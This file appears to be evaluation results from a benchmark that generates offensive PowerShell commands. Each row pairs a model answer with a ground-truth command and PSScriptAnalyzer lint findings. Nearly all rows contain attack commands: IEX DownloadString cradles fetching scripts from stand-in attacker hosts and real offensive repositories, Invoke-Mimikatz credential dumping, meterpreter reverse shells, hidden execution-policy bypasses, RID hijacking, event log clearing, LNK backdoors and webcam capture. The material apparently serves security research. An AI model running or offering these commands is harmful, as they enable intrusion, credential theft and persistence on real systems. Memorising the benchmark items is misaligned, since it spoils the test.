Answer,Ground Truth,ANSWER Rulename,ANSWER Message,ANSWER Severity,TRUTH Rulename,TRUTH Message,TRUTH Severity
Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password9 -Enable,Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password1,[''],[''],[''],[''],[''],['']
Import-Module ${PSmodule} ; Invoke-DNSExfiltrator -i ${PSmodule} -d ${Domain} -p ${pwd} -doh ${DOH} -t ${Time} ${Encoding},Import-Module ${ps_module} ; Invoke-DNSExfiltrator -i ${ps_module} -d ${domain} -p ${password} -doh ${doh} -t ${time} ${encoding},[''],[''],[''],[''],[''],['']
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File bad_script.ps1,powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File malicious.ps1,[''],[''],[''],[''],[''],['']
Invoke-ATHCompiledHTMLHelp -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},Invoke-ATHCompiledHelp -InfoTechStorageHandler ${infotech_storage_handler} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},[''],[''],[''],[''],[''],['']
"Invoke-BackdoorLNK -LNKPath C:\Users\john\Desktop\Firefox.lnk -Command ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')""",Invoke-BackdoorLNK -LNKPath C:\Users\john\Desktop\Firefox.lnk -CleanUp,[''],[''],[''],[''],[''],['']
Clear-Eventlog,$logs = Get-EventLog -List | ForEach-Object {$.Log} ; $logs | ForEach-Object {Clear-EventLog -LogName $ } ; Get-EventLog -list,[''],[''],[''],[''],[''],['']
Invoke-PsExec -ComputerName 192.168.50.200 -Command 'dir C:\' -ServiceName Updater32 -ResultFile 'results.txt',"cmd /c ""${ps_exec_location}"" -accepteula -i -s cmd.exe /c logman update trace ""${session}"" --p ""${provider}"" -ets",['PSAvoidUsingComputerNameHardcoded '],"[""The ComputerName parameter of cmdlet 'Invoke-PsExec' is hardcoded. This will expose sensitive information about the system if the script is shared. ""]",['Error'],[''],[''],['']
"Invoke-CredentialPhishing -UseHost -Credential dcorp-mssql -Command 'exec master..xp_cmdshell ""powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')""'",Invoke-CredentialPhisher,[''],[''],[''],[''],[''],['']
"$url = ""http://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat""; $output = ""C:\temp\Discovery.bat""; Invoke-Expression (New-Object System.Net.WebClient).DownloadFile($url,$output)","$x=""$env:temp\jxm.exe"";(New-Object System.Net.WebClient).DownloadFile('http://evilurl.com/')",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'x' is assigned but never used. ""]",['Warning']
$payload = [System.Text.Encoding]::Unicode.GetBytes('IyEvdXNyL'),"$payload = [System.Text.Encoding]::UTF8.GetBytes(""<malicious payload>""); $process = New-Object System.Diagnostics.Process; $process.StartInfo.FileName = ""powershell.exe""; $process.StartInfo.Arguments = ""-ExecutionPolicy Bypass -NoProfile -EncodedCommand "" + [Convert]::ToBase64String($payload); $process.Start()",['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'payload' is assigned but never used. ""]",['Warning'],[''],[''],['']
Invoke-Command -ComputerName <remote_system> -ScriptBlock {powershell.exe -nop -w hidden -c <command>},Invoke-Command -ComputerName <RemoteSystem> -ScriptBlock { <Powershell Command> },"['RedirectionNotSupported ', ' RedirectionNotSupported ']","[""The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. ""]","['ParseError ', ' ParseError']",['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://heavy.site.com/heavy_code.ps1')""","Invoke-Expression -Command ""IEX(New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')""",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
Start-WebcamRecorder -RecordTime 60 -OutPath 'C:\windows\temp\webcam.mp4',Start-WebcamRecorder -RecordTime 20 -OutPath 'C:\webcam.mov',[''],[''],[''],[''],[''],['']
"powershell.exe -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://server.com/System.ps1')""","powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')""",[''],[''],[''],[''],[''],['']
Import-Module ${Path_To_AtomicsFolder}\T1027.006\bin\T1027_006_tec_remote.html ; Export-File ${Path_To_AtomicsFolder}\T1027_006_tec_remote.html ; Start-Process ${Path_To_AtomicsFolder}\T1027_006_tec_remote.html,"Import-Module AADInternals -Force ; Export-AADIntADFSCertificates ; Get-ChildItem | Where-Object {$_ -like ""ADFS*""} ; Write-Host ""`nCertificates retrieved successfully""",[''],[''],[''],[''],[''],['']
powershell.exe -EncodedCommand AlABAAgAEQAQABEAGgAeAB8AHwAiACMAJgAqAC4AMAAxADUAPgBFAEkATgBUAFYAW,powershell.exe -nop -w hidden -noni -enc <Base64 Encoded Command>,[''],[''],[''],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
Invoke-Expression -Command (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'),iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1'),['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
Get-ChildItem -Path ${host.file.path},ls -recurse ; get-childitem -recurse ; gci -recurse,[''],[''],[''],"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'ls' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')""",powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command {iex (New-Object System.Net.WebClient).DownloadString('http://[malicious_website]/malicious_script.ps1')},[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
Exploit-JenkinsServer -Host 127.0.0.1 -port 8080 -Cmd 'whoami',Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd 'cmd /c netstat -an',[''],[''],[''],[''],[''],['']
Invoke-Command -ComputerName <target_host> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://villain_server/evil_script.ps1')},$Invoke = {IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/malicious_script.ps1')}; Invoke-Command -ScriptBlock $Invoke,"['RedirectionNotSupported ', ' PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","[""The '<' operator is reserved for future use. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning ', ' Warning']","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"Invoke-WebRequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat"" -OutFile ${output_file}","Invoke-WebRequest ${pua_url} -OutFile ${pua_file} ; & ""${pua_file}""",[''],[''],[''],[''],[''],['']
powershell.exe -ExecutionPolicy Bypass -Command Invoke-Mimikatz,"powershell -exec bypass -command ""Invoke-Mimikatz -DumpCreds""",[''],[''],[''],[''],[''],['']
Get-WmiObject -ClassName win32_operatingsystem | Out-File -FilePath C:\results.csv -NoTypeInformation,"powershell.exe -c ""Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log""",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')""","powershell -ep bypass -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');""",[''],[''],[''],[''],[''],['']
Invoke-Command -ComputerName <remote_system_name> -ScriptBlock {powershell.exe -nop -w hidden -c <command>},Invoke-Command -ComputerName <hostname> -ScriptBlock { < code > },"['RedirectionNotSupported ', ' RedirectionNotSupported ']","[""The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. ""]","['ParseError ', ' ParseError']","['RedirectionNotSupported ', ' MissingFileSpecification ']","[""The '<' operator is reserved for future use. "", ' Missing file specification after redirection operator. ']","['ParseError ', ' ParseError']"
"Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://heavy.site.com/heavy_code.ps1')""","Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')""",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
Invoke-ATHHTMLApplication -FilePath ${hta_file_path} -ScriptEngine ${script_engine} -SimulateUserDoubleClick -MSHTAFilePath ${mshta_file_path},Invoke-ATHHTMLApplication -HTAFilePath ${hta_file_path} -ScriptEngine ${script_engine} -SimulateUserDoubleClick,[''],[''],[''],[''],[''],['']
"(New-Object Net.WebClient).DownloadFile(""http://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat"") -OutFile ${OutputFILE}",Invoke-WebRequest -Url http://malicious-server.com/malicious-file.exe -OutFile C:\malicious-file.exe,"['UnexpectedToken ', ' UnexpectedToken ']","[""Unexpected token '-OutFile' in expression or statement. "", "" Unexpected token '${OutputFILE}' in expression or statement. ""]","['ParseError ', ' ParseError']",[''],[''],['']
Invoke-RIDHijacking -User alice -RID 500,Invoke-RIDHijacking -User alice -RID 500,[''],[''],[''],[''],[''],['']
$PSBypass = New-Object System.Net.WebClient; $PSBypass.Credentials = [System.Net.CredentialCache] ; Invoke-Mimikatz -DumpCreds,"$Bypass = New-Object System.Management.Automation.PSBypass; $Bypass.AddScript(""Invoke-Mimikatz -DumpCreds""); $Bypass.Invoke()",[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malicious-url')""","powershell.exe -nop -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http://evilurl.com/evil.ps1'))"";",[''],[''],[''],[''],[''],['']
powershell.exe -ExecutionPolicy Bypass -File C:\script.ps1,"powershell.exe -ExecutionPolicy Bypass -NoProfile -File ""C:\Users\attacker\script.ps1""",[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -Command ""Invoke-Mimikatz""","powershell -ep bypass -c ""Invoke-Mimikatz""",[''],[''],[''],[''],[''],['']
Invoke-Expression -Command (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'),IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'),['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
cd $env:temp ; .\kerbrute.exe bruteforce --dc ${DomainController} -d ${Domain} $env:temp\bruteForce.txt,cd $env:temp ; .\kerbrute.exe bruteforce --dc ${domain_controller} -d ${Domain} $env:temp\brute_force.txt,['PSAvoidUsingCmdletAliases '],"[""'cd' is an alias of 'Set-Location'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],['PSAvoidUsingCmdletAliases '],"[""'cd' is an alias of 'Set-Location'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
powershell.exe -ExecutionPolicy Bypass -File C:\script.ps1,powershell.exe -ExecutionPolicy Bypass -File sysWin.ps1,[''],[''],[''],[''],[''],['']
Invoke-NinjaCopy -Path 'C:\windows;tds;tds.dit' -LocalDestination 'C:\windows\temp;tds.dit',Invoke-NinjaCopy -Path 'C:\windows\clrt\clrt.dit' -LocalDestination 'C:\windows\temp\clrt.dit',[''],[''],[''],[''],[''],['']
Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Host 192.168.1.1 -Port 443,Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.1.1 -Lport 443,[''],[''],[''],[''],[''],['']
"Start-Process ${nsudo_path} ; Start-Sleep -Second 5 ; Stop-Process -Name ""cmd""","Start-Process ${nsudo_path} -Argument ""-U:T -P:E cmd"" ; Start-Sleep -Second 5 ; Stop-Process -Name ""cmd"" -force -erroraction silentlycontinue",[''],[''],[''],[''],[''],['']
Invoke-Command -ComputerName 192.168.1.1 -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://malicious-site')},"$command = ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')""; Invoke-Command -ScriptBlock { Invoke-Expression $using:command }","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingComputerNameHardcoded ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" The ComputerName parameter of cmdlet 'Invoke-Command' is hardcoded. This will expose sensitive information about the system if the script is shared. "", "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Error ', ' Warning']",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://heavy.site.com/heavy_code.ps1')""","Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')""",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')""","powershell.exe -exec bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('https://malicious-website.com/malicious.ps1')""",[''],[''],[''],[''],[''],['']
Get-BrowserInformation -Browser All -Datatype History -UserName Alice -Search 'twitter',Get-BrowserInformation -Browser All -Datatype History -UserName Luca -Search 'wikipedia',[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-WiFi""",.\wifi.ps1 -Off,[''],[''],[''],[''],[''],['']
"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')""","powershell.exe -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/execKern.ps1')""",[''],[''],[''],[''],[''],['']
"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-server.com/malicious-script.ps1')},[''],[''],[''],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedtar/DumpWCM.tar'),tar -czf ${host.dir.git}.tar.gz -C ${host.dir.git} *; Write-Host ${host.dir.git}.tar.gz; exit 0;,[''],[''],[''],[''],[''],['']
"$content = Get-Content ${input_file} ; Get-WinUpdates -File $content -Properties * | Format-Table name, DisplayName","Get-Content computers.txt | Get-WinUpdates | Format-Table PC,Date,Operation,Status,Title,KB,PC -Wrap -auto",[''],[''],[''],[''],[''],['']
"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'),[''],[''],[''],[''],[''],['']
netsh interface portproxy add v4tov4 listenport=${listenport} connectport=${connectport} connectaddress=${connectaddress},netsh interface portproxy add v4tov4 listenport=${listen_port} connectport=${connect_port} connectaddress=${connect_address},[''],[''],[''],[''],[''],['']
$env:COR_ENABLE_PROFILING = 1 ; $env:COR_PROFILER = '${clsid_guid}' ; $env:COR_PROFILER_PATH = '${file_name}' ; POWERSHELL -c 'sleep 1',$env:COR_ENABLE_PROFILING = 1 ; $env:COR_PROFILER = '${cls_guid}' ; $env:COR_PROFILER_PATH = '${filename}' ; POWERSHELL -c 'Start-Sleep 1',[''],[''],[''],[''],[''],['']
Invoke-RIDHijacking -User Joe -RID 500 -Password Password1 -Enable,Invoke-RIDHijacking -User alice -RID 500 -Password Password1 -Enable,[''],[''],[''],[''],[''],['']
get-wmiObject -class Win32_Group,Get-WMIObject Win32_Group,['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
Get-Date -Format %Y-%m-%d %H:%M:%S,Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ',[''],[''],[''],[''],[''],['']
"powershell.exe -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://malicious-ip.com/malicious-script.ps1')""",python ${file_name} -i ${IP},[''],[''],[''],[''],[''],['']
powershell.exe -ExecutionPolicy Bypass -File C:\script.ps1,powershell.exe -ExecutionPolicy Bypass -File C:\Users\User\somecode.ps1,[''],[''],[''],[''],[''],['']
Set-ExecutionPolicy Bypass -Scope Process -Force; .\script.ps1 -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.1 -Lport 443,Invoke-WScriptBypass -payload 'powershell.exe -ep Bypass -WindowStyle Hidden -enc <base64>',[''],[''],[''],[''],[''],['']
"$payload = [System.Text.Encoding]::Unicode.GetBytes(""Invoke-Mimikatz -DumpCreds"")","$payload = [System.Text.Encoding]::Unicode.GetBytes(""Invoke-Mimikatz"")",['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'payload' is assigned but never used. ""]",['Warning'],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'payload' is assigned but never used. ""]",['Warning']
Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 323,Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 500,[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-Inveigh -Command (New-Object Net.WebClient).DownloadString('http://evil-site.com')""",./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10,[''],[''],[''],[''],[''],['']
Invoke-Expression -Command ${host_ip} -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://evil_script.ps1') },python ${filename} -i ${host_ip},"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']",[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -Command ""Invoke-Mimikatz""","powershell.exe -exec bypass -c ""Invoke-Mimikatz""",[''],[''],[''],[''],[''],['']
"Start-Process ${DirLister_Path} ; Start-Sleep -Second 4 ; Stop-Process -Name ""DirLister""","Start-Process ${dirlister_path} ; Start-Sleep -Second 4 ; Stop-Process -Name ""DirLister""",[''],[''],[''],[''],[''],['']
"Start-Process ${WebBrowserPassViewPath} ; Start-Sleep -Second 4 ; Stop-Process -Name ""WebBrowserPassView""","Start-Process ${webbrowserpassview_path} ; Start-Sleep -Second 4 ; Stop-Process -Name ""WebBrowserPassView""",[''],[''],[''],[''],[''],['']
Invoke-CompiledHelp -ScriptEngine ${script_engine} -InfoTechStorageHandler ${infotech_storage_handler} -TopicExtension ${topic_extension} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler ${infotech_storage_handler} -TopicExtension ${topic_extension} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},[''],[''],[''],[''],[''],['']
"$ElevatedOptions = New-ElevatedPersistenceOption -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-WmiMethod -Command (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')""",$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM',['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'ElevatedOptions' is assigned but never used. ""]",['Warning'],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'ElevatedOptions' is assigned but never used. ""]",['Warning']
"Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://heavy.site.com/heavy_code.ps1')""","$payload = 'IEX (New-Object Net.WebClient).DownloadString(""http://somesurl.com/juve.ps1"")'; Invoke-Expression $payload",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
get-wmiObject -class Win32_UserAccount,Get-WmiObject -Class Win32_UserAccount,['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://meterpreter.com/meterpreter.ps1')},Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 10.0.0.1 -Lport 443; Invoke-C,"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']",[''],[''],['']
"Get-IndexedItem -Filter Stingray -Properties kind = 'picture' -Keywords 'portfolio' -Recurse | ? { $_.IsGroup -match 'false' } | select samaccountname , description , pwdlastset , logoncount , badpwdcount","Get-IndexedItem -Filter Contains(*,'Stingray'), kind = 'picture', keywords='portfolio'","['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'?' is an alias of 'Where-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'select' is an alias of 'Select-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']",['MissingArgument '],['Missing argument in parameter list. '],['ParseError']
Set-MpPreference -LogLocation 'C:\Users\Public\script.ps1' -ErrorAction 'SilentlyContinue'; Set-MpPreference -LogLocation 'C:\Users\Public\script.ps1' -ErrorAction 'SilentlyContinue'; Set-MpPreference -LogLocation 'C:\Users\Public\script.ps1' -Command 'Unspecified',$ScriptBlockLoggingPreference='SilentlyContinue'; $ErrorActionPreference='SilentlyContinue'; $VerbosePreference='SilentlyContinue'; Invoke-SomeCmdlet -Parameter1 Value1 -Parameter2 Value2,[''],[''],[''],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'ScriptBlockLoggingPreference' is assigned but never used. ""]",['Warning']
"Invoke-Shellcode -Shellcode @(0xC7,0xE9)","Invoke-Shellcode -Shellcode @(0xE9,0x90,0x83)",[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass  IEX (New-Object Net.WebClient).DownloadString('http://site.com/code'),[''],[''],[''],[''],[''],['']
Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -UseRundll32 -File C:\Users\Public\rundll32.exe,Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -UseRundll32 -Rundll32FilePath ${rundll32_file_path},[''],[''],[''],[''],[''],['']
Invoke-Command -ComputerName <file_path> -ScriptBlock {<xml_payload>},"${mwcpath}\${mwcname} ""${xml_payload}"" output.txt",['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError'],['UnexpectedToken '],"[""Unexpected token '\\${mwcname}' in expression or statement. ""]",['ParseError']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-WebRequest http://www.somewhere.com/hello.ps1 -OutFile hello.ps1; .\hello.ps1""","powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""IEX (Invoke-WebRequest -Uri 'http://HeavySite.com/script.ps1').Content""",[''],[''],[''],[''],[''],['']
Get-NetIPResource -ComputerName < remote_host> -Domain < domain_name>,net view \\${remote.host.fqdn} /all,"['RedirectionNotSupported ', ' RedirectionNotSupported ']","[""The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. ""]","['ParseError ', ' ParseError']",[''],[''],['']
